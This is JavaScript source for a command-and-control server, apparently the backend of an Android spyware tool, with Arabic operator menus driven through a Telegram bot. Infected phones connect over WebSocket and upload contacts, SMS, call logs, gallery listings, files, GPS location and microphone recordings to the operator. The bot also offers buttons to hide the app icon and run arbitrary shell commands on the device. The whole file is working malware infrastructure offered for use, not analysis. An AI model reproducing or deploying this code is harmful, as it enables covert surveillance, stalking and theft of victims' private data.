require('dotenv').config();
const express = require('express');
const webSocket = require('ws');
const http = require('http');
const https = require('https');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');

const token = process.env.TG_TOKEN;
const id = process.env.TG_ID;
const AGENT_SECRET = process.env.AGENT_SECRET || 'default_secret';

if (!token || !id) { console.error('Missing tokens'); process.exit(1); }

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();
const upload = multer({ limits: { fileSize: 200 * 1024 * 1024 } });
app.use(bodyParser.json({ limit: '200mb' }));

app.get('/health', (req, res) => res.status(200).send('OK'));
app.get('/', (req, res) => res.send('<h1>Queen Hadil C2 Active</h1>'));

const SELF_URL = process.env.RENDER_EXTERNAL_URL || null;
if (SELF_URL) {
    setInterval(() => {
        https.get(`${SELF_URL}/health`, (res) => {}).on('error', () => {});
    }, 14 * 60 * 1000);
}

function escapeHtml(str) {
    return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function sendLongText(title, agentId, text) {
    const MAX = 3500;
    const total = (text || '').length;
    await appBot.sendMessage(id, `${title}\n📱 من: <b>${agentId}</b>\n📊 ${total} حرف`, { parse_mode: 'HTML' }).catch(() => {});
    if (total === 0) { await appBot.sendMessage(id, '📭 (فارغ)').catch(() => {}); return; }
    const chunks = [];
    for (let i = 0; i < total; i += MAX) chunks.push(text.substring(i, i + MAX));
    for (let i = 0; i < chunks.length; i++) {
        const prefix = chunks.length > 1 ? `<b>[${i + 1}/${chunks.length}]</b>\n` : '';
        await appBot.sendMessage(id, prefix + `<pre>${escapeHtml(chunks[i])}</pre>`, { parse_mode: 'HTML' }).catch(() => {});
        if (i < chunks.length - 1) await new Promise(r => setTimeout(r, 700));
    }
}

// ═══════════════════════════════════════════════════════
// 📤 رفع الملفات
// ═══════════════════════════════════════════════════════
app.post('/uploadFile', upload.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file');
    const ext = req.file.originalname.split('.').pop().toLowerCase();
    const sizeKB = (req.file.size / 1024).toFixed(1);
    const caption = `°• ملف من <b>${req.headers.model || '?'}</b>\n📄 ${req.file.originalname}\n📦 ${sizeKB} KB`;

    if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(ext))
        appBot.sendPhoto(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    else if (['mp3', 'ogg', 'wav', 'm4a', 'aac', 'opus', 'flac'].includes(ext))
        appBot.sendAudio(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    else if (['mp4', 'avi', 'mov', 'mkv', '3gp', 'webm'].includes(ext))
        appBot.sendVideo(id, req.file.buffer, { caption, parse_mode: 'HTML' }).catch(() => {});
    else
        appBot.sendDocument(id, req.file.buffer, { caption, parse_mode: 'HTML' }, { filename: req.file.originalname }).catch(() => {});
    res.send('');
});

// ═══════════════════════════════════════════════════════
// 📝 رفع النصوص
// ═══════════════════════════════════════════════════════
app.post('/uploadText', async (req, res) => {
    await sendLongText(req.body.title || 'تقرير', req.body.agentId || '?', req.body.text || '');
    res.send('');
});

app.post('/uploadContacts', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = '';
        list.forEach((c, i) => { text += `${i + 1}. ${c.name || '?'}\n   📞 ${c.phone || '?'}\n`; });
        await sendLongText(`👥 جهات الاتصال (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadMessages', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = '';
        list.forEach((m, i) => { text += `${i + 1}. [${m.type}] من: ${m.from || '?'}\n   ${(m.body || '').substring(0, 300)}\n\n`; });
        await sendLongText(`💬 الرسائل (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadCalls', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = '';
        list.forEach((c, i) => { text += `${i + 1}. ${c.type || '?'} — ${c.number || '?'}\n   ⏱️ ${c.duration || 0} ثانية\n\n`; });
        await sendLongText(`📞 سجل المكالمات (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadGallery', async (req, res) => {
    try {
        const list = JSON.parse(req.body.list || '[]');
        let text = `لجلب صورة: <code>send_image:ID</code>\n\n`;
        list.forEach((img, i) => {
            text += `${i + 1}. 🖼️ ${img.name || '?'}\n   🆔 ID: ${img.id || '?'}\n   📦 ${img.size || 0} بايت\n`;
        });
        await sendLongText(`🖼️ المعرض (${list.length})`, req.body.agentId || '?', text);
    } catch (e) {}
    res.send('');
});

app.post('/uploadLocation', (req, res) => {
    appBot.sendLocation(id, req.body.lat, req.body.lon).catch(() => {});
    appBot.sendMessage(id, `📍 احداثيات موقع من <b>${req.body.agentId || '?'}</b>\n🎯 الدقة: ${req.body.accuracy || '?'} م`, { parse_mode: 'HTML' }).catch(() => {});
    res.send('');
});

// ═══════════════════════════════════════════════════════
// 🔌 WebSocket
// ═══════════════════════════════════════════════════════
appSocket.on('connection', (ws, req) => {
    const authKey = req.headers['x-agent-key'];
    if (AGENT_SECRET !== 'default_secret' && authKey !== AGENT_SECRET) {
        ws.close(1008, 'Unauthorized'); return;
    }
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const provider = req.headers.provider || 'N/A';
    ws.uuid = uuid;
    ws.isAlive = true;
    appClients.set(uuid, { model, battery, version, provider });

    appBot.sendMessage(id,
        `🥷 <b>تم اتصال عميل جديد بنجاح</b>\n\n📱 الجهاز: <b>${model}</b>\n🔋 البطارية: <b>${battery}</b>\n🤖 النظام: <b>${version}</b>\n📶 الشبكة: <b>${provider}</b>\n🆔 ID: <code>${uuid}</code>`,
        { parse_mode: 'HTML' }
    ).catch(() => {});

    ws.on('pong', () => { ws.isAlive = true; });
    ws.on('close', () => {
        appClients.delete(ws.uuid);
        appBot.sendMessage(id, `🔴 انقطع اتصال الجهاز\n• ${model}`, { parse_mode: 'HTML' }).catch(() => {});
    });
    ws.on('error', (e) => {});
});

// ═══════════════════════════════════════════════════════
// 🎛️ لوحات التحكم
// ═══════════════════════════════════════════════════════
const kbMain = {
    parse_mode: 'HTML',
    reply_markup: {
        keyboard: [
            ['📱 الأجهزة المتصلة'],
            ['🎮 لوحة التحكم']
        ],
        resize_keyboard: true
    }
};

const cmdsForDevice = (uuid) => ({
    inline_keyboard: [
        [
            { text: '🥷 إخفاء الأيقونة', callback_data: `hide_icon:${uuid}` },
            { text: '📍 الموقع', callback_data: `location:${uuid}` }
        ],
        [
            { text: '👥 جهات الاتصال', callback_data: `contacts:${uuid}` },
            { text: '💬 الرسائل', callback_data: `messages:${uuid}` }
        ],
        [
            { text: '📞 المكالمات', callback_data: `calls:${uuid}` },
            { text: '🖼️ المعرض', callback_data: `gallery:${uuid}` }
        ],
        [
            { text: '📂 محتويات التخزين', callback_data: `list_sdcard:${uuid}` },
            { text: '📊 معلومات النظام', callback_data: `sysinfo:${uuid}` }
        ],
        [
            { text: '📶 WiFi', callback_data: `wifi:${uuid}` },
            { text: '🔋 البطارية', callback_data: `battery:${uuid}` }
        ],
        [
            { text: '⚡ تنفيذ Shell', callback_data: `shell_prompt:${uuid}` },
            { text: '📦 ضغط مجلد ZIP', callback_data: `zip_prompt:${uuid}` }
        ],
        [
            { text: '📁 مسار مخصص', callback_data: `path_prompt:${uuid}` },
            { text: '🎙️ تسجيل صوتي', callback_data: `mic_prompt:${uuid}` }
        ],
        [
            { text: '🔍 بحث عن ملف', callback_data: `find_prompt:${uuid}` }
        ],
        [
            { text: '🔙 رجوع', callback_data: `back:${uuid}` }
        ]
    ]
});

// ═══════════════════════════════════════════════════════
// 📩 استقبال الرسائل النصية
// ═══════════════════════════════════════════════════════
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (chatId.toString() !== id.toString()) return;
    const text = message.text;
    if (!text) return;

    if (text === '/start') {
        appBot.sendMessage(id, '👑 <b>لوحة التحكم المركزية - ناصر دين الله الكلعي</b>\n\nاختر من الأزرار:', kbMain);
        return;
    }
    if (text === '📱 الأجهزة المتصلة') {
        if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد أجهزة متصلة حالياً');
        let t = '📱 <b>الأجهزة النشطة:</b>\n\n';
        appClients.forEach((v, k) => { t += `• <b>${v.model}</b>\n   🔋 ${v.battery} | 🤖 ${v.version}\n   📶 ${v.provider}\n   🆔 <code>${k}</code>\n\n`; });
        appBot.sendMessage(id, t, { parse_mode: 'HTML' });
        return;
    }
    if (text === '🎮 لوحة التحكم') {
        if (appClients.size === 0) return appBot.sendMessage(id, '❌ لا توجد أجهزة متصلة');
        const kb = [];
        appClients.forEach((v, k) => { kb.push([{ text: `📱 ${v.model}`, callback_data: `device:${k}` }]); });
        appBot.sendMessage(id, '🎮 حدد الجهاز للسيطرة:', { reply_markup: { inline_keyboard: kb } });
        return;
    }
});

// ═══════════════════════════════════════════════════════
// 🔘 معالج الأزرار
// ═══════════════════════════════════════════════════════
appBot.on('callback_query', async (cb) => {
    const msg = cb.message;
    const [cmd, uuid] = cb.data.split(':');
    const agent = uuid ? appClients.get(uuid) : null;

    const sendCmd = (cmdStr) => {
        let sent = false;
        appSocket.clients.forEach((ws) => { if (ws.uuid === uuid) { ws.send(cmdStr); sent = true; } });
        return sent;
    };

    const delAndSend = async (text) => {
        await appBot.deleteMessage(id, msg.message_id).catch(() => {});
        await appBot.sendMessage(id, text, kbMain).catch(() => {});
    };

    if (cmd === 'device') {
        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'الجهاز غير متصل' });
        await appBot.editMessageText(`🎮 <b>${agent.model}</b>\n\nاختر الأمر المطلوب تنفيذه:`,
            { chat_id: id, message_id: msg.message_id, parse_mode: 'HTML', reply_markup: cmdsForDevice(uuid) }).catch(() => {});
        return;
    }
    if (cmd === 'back') {
        const kb = [];
        appClients.forEach((v, k) => { kb.push([{ text: `📱 ${v.model}`, callback_data: `device:${k}` }]); });
        await appBot.editMessageText('🎮 حدد الجهاز:', { chat_id: id, message_id: msg.message_id, reply_markup: { inline_keyboard: kb } }).catch(() => {});
        return;
    }

    // أوامر تحتاج إدخالاً
    if (cmd === 'shell_prompt') {
        await appBot.sendMessage(id, '⚡ <b>أدخل أمر Shell:</b>\nمثال: <code>shell:ls -la /sdcard/</code>', { parse_mode: 'HTML', reply_markup: { force_reply: true } });
        return;
    }
    if (cmd === 'zip_prompt') {
        await appBot.sendMessage(id, '📦 <b>أدخل مسار المجلد للضغط:</b>\nمثال: <code>zip_dir:DCIM/Screenshots</code>', { parse_mode: 'HTML', reply_markup: { force_reply: true } });
        return;
    }
    if (cmd === 'path_prompt') {
        await appBot.sendMessage(id,
            '📁 <b>الأوامر المتاحة للمسارات:</b>\n\n' +
            '• <code>list:DCIM/Camera</code> — عرض محتوى\n' +
            '• <code>read:Download/notes.txt</code> — قراءة ملف\n' +
            '• <code>send_file:Download/test.pdf</code> — إرسال ملف\n' +
            '• <code>find:IMG</code> — البحث عن ملف',
            { parse_mode: 'HTML', reply_markup: { force_reply: true } });
        return;
    }
    if (cmd === 'mic_prompt') {
        await appBot.sendMessage(id, '🎙️ <b>أدخل مدة التسجيل بالثواني:</b>\nمثال: <code>mic:30</code>', { parse_mode: 'HTML', reply_markup: { force_reply: true } });
        return;
    }
    if (cmd === 'find_prompt') {
        await appBot.sendMessage(id, '🔍 <b>أدخل اسم الملف للبحث:</b>\nمثال: <code>find:screenshot</code>', { parse_mode: 'HTML', reply_markup: { force_reply: true } });
        return;
    }

    // الأوامر الفورية
    const instant = [
        'contacts', 'calls', 'messages', 'location',
        'gallery', 'list_sdcard', 'hide_icon',
        'sysinfo', 'wifi', 'battery'
    ];
    if (instant.includes(cmd)) {
        if (!agent) return appBot.answerCallbackQuery(cb.id, { text: 'الجهاز غير متصل' });
        const ok = sendCmd(cmd);
        await delAndSend(ok ? `✅ تم إرسال الأمر: <b>${cmd}</b>\n⏳ جاري المعالجة...` : '❌ فشل إرسال الأمر');
        return;
    }
});

// ═══════════════════════════════════════════════════════
// 📝 معالج الردود على الرسائل
// ═══════════════════════════════════════════════════════
appBot.on('message', async (message) => {
    if (!message.reply_to_message) return;
    if (message.chat.id.toString() !== id.toString()) return;

    let uuid = null;
    appClients.forEach((v, k) => { if (!uuid) uuid = k; });
    if (!uuid) return;

    const cmd = (message.text || '').trim();
    if (!cmd) return;

    // تحقق من صحة الأمر
    const validPrefixes = [
        'shell:', 'zip_dir:', 'send_image:', 'send_file:',
        'list:', 'read:', 'find:', 'search:', 'mic:'
    ];
    const isValid = validPrefixes.some(p => cmd.startsWith(p));

    if (!isValid) {
        await appBot.sendMessage(id, `⚠️ صيغة الأمر غير صحيحة: <code>${cmd}</code>\n\nالصيغ الصحيحة:\n• <code>list:PATH</code>\n• <code>zip_dir:PATH</code>\n• <code>shell:COMMAND</code>\n• <code>find:NAME</code>\n• <code>read:PATH</code>\n• <code>send_file:PATH</code>\n• <code>mic:SECONDS</code>`, { parse_mode: 'HTML' });
        return;
    }

    appSocket.clients.forEach((ws) => { if (ws.uuid === uuid) ws.send(cmd); });
    appBot.sendMessage(id, `📤 جاري تنفيذ: <code>${cmd}</code>`, { parse_mode: 'HTML', ...kbMain });
});

// ═══════════════════════════════════════════════════════
// 💓 نبضات الاتصال
// ═══════════════════════════════════════════════════════
setInterval(() => {
    appSocket.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        try { ws.ping(); } catch (e) {}
    });
}, 30000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, '0.0.0.0', () => console.log(`✅ C2 Server running on port ${PORT}`));
